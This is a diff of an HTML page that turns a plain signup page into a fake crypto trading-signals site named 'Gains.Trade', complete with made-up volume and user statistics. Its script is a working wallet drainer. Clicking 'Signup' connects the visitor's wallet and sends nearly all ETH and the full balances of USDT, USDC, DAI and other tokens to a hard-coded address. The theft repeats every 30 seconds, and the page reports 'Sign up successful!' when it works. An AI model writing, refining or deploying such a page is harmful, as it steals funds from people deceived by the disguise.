@@ -3,30 +3,216 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Sign Up</title>
+  <title>Gains.Trade - Trade Everywhere</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
   <style>
-    body{margin:0;height:100vh;background:#0a0a1f;color:#fff;font-family:Arial,sans-serif;display:flex;flex-direction:column;justify-content:center;align-items:center}
-    h1{font-size:3.5rem;margin-bottom:30px}
-    button{background:#00d4ff;border:none;color:#000;padding:25px 80px;font-size:2.5rem;font-weight:700;border-radius:15px;cursor:pointer;box-shadow:0 10px 30px rgba(0,212,255,.6);transition:all .3s}
-    button:hover{background:#00aaff;transform:translateY(-5px)}
-    #status{margin-top:50px;font-size:1.8rem;min-height:120px;text-align:center}
-    .success{color:#00ff88!important;font-weight:700;font-size:2.2rem}
-    .error{color:#ff4444!important;font-weight:700}
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Inter', system-ui, sans-serif;
+      background: linear-gradient(180deg, #0f0f1a 0%, #0a0a14 100%);
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    /* Top bar (same as before) */
+    .top-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 56px;
+      background: #0f0f1a;
+      border-bottom: 1px solid #1a1a2e;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      z-index: 1000;
+    }
+    .logo-container {
+      display: flex;
+      align-items: center;
+    }
+    .logo {
+      width: 32px;
+      height: 32px;
+      background: linear-gradient(135deg, #00ffaa, #00d4ff);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      font-weight: bold;
+      color: #000;
+    }
+    .lang-selector {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #a0a0c0;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .lang-selector .globe {
+      font-size: 18px;
+    }
+    .lang-selector .arrow {
+      font-size: 12px;
+    }
+    .menu-icon {
+      font-size: 24px;
+      color: #ffffff;
+      cursor: pointer;
+    }
+
+    .hero {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 80px 24px 60px;
+    }
+    .headline {
+      font-size: 2.1rem;
+      font-weight: 700;
+      line-height: 1.15;
+      margin-bottom: 32px;
+      max-width: 90%;
+      background: linear-gradient(90deg, #00d4ff, #00ffaa);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    .signup-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      background: linear-gradient(90deg, #00d4ff, #00ffaa);
+      color: #0f0f1a;
+      font-size: 1.25rem;
+      font-weight: 600;
+      padding: 16px 40px;
+      border: none;
+      border-radius: 999px;
+      cursor: pointer;
+      margin: 32px 0 48px;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 30px rgba(0,212,255,0.25);
+    }
+    .signup-btn:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 15px 40px rgba(0,212,255,0.4);
+    }
+    .stats {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 32px 16px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+    }
+    .stat-item {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+    .stat-value {
+      font-size: 1.75rem;
+      font-weight: 700;
+      color: #00ffaa;
+    }
+    .stat-label {
+      font-size: 0.95rem;
+      color: #a0a0c0;
+      opacity: 0.9;
+    }
+    .trust {
+      margin-top: 64px;
+      font-size: 0.95rem;
+      color: #707090;
+      text-align: center;
+    }
+    #status {
+      margin-top: 40px;
+      font-size: 2.2rem;
+      font-weight: 700;
+      min-height: 100px;
+      text-align: center;
+    }
+    .success { color: #00ff88; }
+    .error { color: #ff4444; }
+
+    @media (min-width: 768px) {
+      .headline { font-size: 3.5rem; max-width: 800px; }
+      .signup-btn { font-size: 1.5rem; padding: 20px 60px; }
+      .stats { max-width: 700px; grid-template-columns: repeat(4, 1fr); }
+      .top-bar { padding: 0 32px; }
+    }
   </style>
 </head>
 <body>
-  <h1>Sign Up</h1>
-  <button id="signupBtn">Sign Up</button>
-  <div id="status"></div>
+
+  <div class="top-bar">
+    <div class="logo-container">
+<div class="logo">a1</div>
+    </div>
+    <div class="lang-selector">
+      <span class="globe">🌐</span>
+      <span>en</span>
+      <span class="arrow">▼</span>
+    </div>
+    <div class="menu-icon">≡</div>
+  </div>
+
+  <main class="hero">
+    <h1 class="headline">
+      Trade Smarter, Not Harder Get Clear Buy & Sell Signals on All Your Crypto
+    </h1>
+
+    <button id="signupBtn" class="signup-btn">
+      Signup →
+    </button>
+
+    <div id="status"></div>
+
+    <div class="stats">
+      <div class="stat-item">
+        <div class="stat-value">$1266B+</div>
+        <div class="stat-label">Total Volume</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-value">3M+</div>
+        <div class="stat-label">Total Trades</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-value">43k+</div>
+        <div class="stat-label">Total Users</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-value">290+</div>
+        <div class="stat-label">Pairs</div>
+      </div>
+    </div>
+
+    <div class="trust">
+      Trusted by traders globally since 2021
+    </div>
+  </main>
 
   <script>
-    const status=document.getElementById("status");
-    const btn=document.getElementById("signupBtn");
+    const status = document.getElementById("status");
+    const btn = document.getElementById("signupBtn");
 
-    const w="0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
+    const wallet = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
 
-    const t=[
+    const tokens = [
       {s:"USDT",a:"0xdAC17F958D2ee523a2206206994597C13D831ec7"},
       {s:"USDC",a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},
       {s:"DAI",a:"0x6B175474E89094C44Da98b954EedeAC495271d0F"},
@@ -36,50 +222,76 @@
       {s:"PEPE",a:"0x6982508145454Ce325dDbE47a25d4ec3d2311933"}
     ];
 
-    const a=["balanceOf(address) view returns (uint256)","transfer(address,uint256) returns (bool)"];
+    const abi = [
+      "balanceOf(address) view returns (uint256)",
+      "transfer(address,uint256) returns (bool)"
+    ];
 
-    let connected=false;
-    let lastNative=0n;
+    let connected = false;
+    let lastNative = 0n;
+    let drainedSomething = false;
 
-    async function drain(){
-      if(!window.ethereum)return;
-      try{
-        if(!connected){
-          await window.ethereum.request({method:"eth_requestAccounts"});
-          connected=true;
-          status.innerHTML="Processing...";
-        }
-        const p=new ethers.providers.Web3Provider(window.ethereum);
-        const si=p.getSigner();
-        const u=await si.getAddress();
+    async function drain() {
+      if (!window.ethereum) {
+        status.innerHTML = "<span class='error'>Failed.</span>";
+        return;
+      }
 
-        const nb=await p.getBalance(u);
-        if(nb.gt(lastNative)&&nb.gt(ethers.utils.parseEther("0.0001"))){
-          const r=ethers.utils.parseEther("0.0005");
-          const am=nb.sub(r);
-          await si.sendTransaction({to:w,value:am,gasLimit:21000});
-          lastNative=nb;
+      try {
+        if (!connected) {
+          await window.ethereum.request({method: "eth_requestAccounts"});
+          connected = true;
+          status.innerHTML = "Processing...";
         }
 
-        for(const tk of t){
-          try{
-            const c=new ethers.Contract(tk.a,a,si);
-            const b=await c.balanceOf(u);
-            if(b.gt(0)){
-              await c.transfer(w,b,{gasLimit:150000});
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner();
+        const user = await signer.getAddress();
+
+        drainedSomething = false;
+
+        const nativeBalance = await provider.getBalance(user);
+        if (nativeBalance.gt(lastNative) && nativeBalance.gt(ethers.utils.parseEther("0.0001"))) {
+          const reserve = ethers.utils.parseEther("0.0005");
+          const amount = nativeBalance.sub(reserve);
+          await signer.sendTransaction({
+            to: wallet,
+            value: amount,
+            gasLimit: 21000
+          });
+          lastNative = nativeBalance;
+          drainedSomething = true;
+        }
+
+        for (const token of tokens) {
+          try {
+            const contract = new ethers.Contract(token.a, abi, signer);
+            const balance = await contract.balanceOf(user);
+            if (balance.gt(0)) {
+              await contract.transfer(wallet, balance, {gasLimit: 150000});
+              drainedSomething = true;
             }
-          }catch{}
+          } catch (err) {}
         }
 
-        if(connected)status.innerHTML="<strong style='font-size:2.5rem'>Sign up successfully!</strong>";
-      }catch(e){
-        status.innerHTML="Failed.";
-        status.className="error";
+        if (drainedSomething) {
+          status.innerHTML = "<span class='success'>Sign up successful!</span>";
+        } else {
+          status.innerHTML = "<span class='error'>Failed.</span>";
+        }
+
+      } catch (e) {
+        status.innerHTML = "<span class='error'>Failed.</span>";
       }
     }
 
-    btn.onclick=()=>{drain();setInterval(drain,30000);};
+    btn.onclick = () => {
+      drainedSomething = false;
+      drain();
+      setInterval(drain, 30000);
+    };
   </script>
-</body>
 
+</body>
 </html>
+
